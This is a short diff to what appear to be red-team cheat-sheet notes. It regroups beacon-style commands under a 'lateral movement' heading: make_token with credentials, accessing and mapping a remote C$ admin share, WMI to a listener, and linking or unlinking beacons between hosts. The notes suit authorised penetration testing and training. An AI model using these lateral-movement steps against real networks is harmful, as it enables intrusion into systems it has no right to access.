@@ -8,12 +8,12 @@ xhost 127.0.0.1
 or
 export DIAPLAY=:0
 
-
-make_token username password
-shell ls \\system\c$
-shell net use \\system\c$
-wmi \\system listener
-spawn listener
-unlink ip addr of attack system (from target)
-link ip addr of target system (from attack box)
-exit original beacon
+lateral movement
+  make_token username password
+  shell dir \\system\c$
+  shell net use \\system\c$
+  wmi \\system listener
+  spawn listener
+  unlink ip addr of attack system (from target)
+  link ip addr of target system (from attack box)
+  exit original beacon
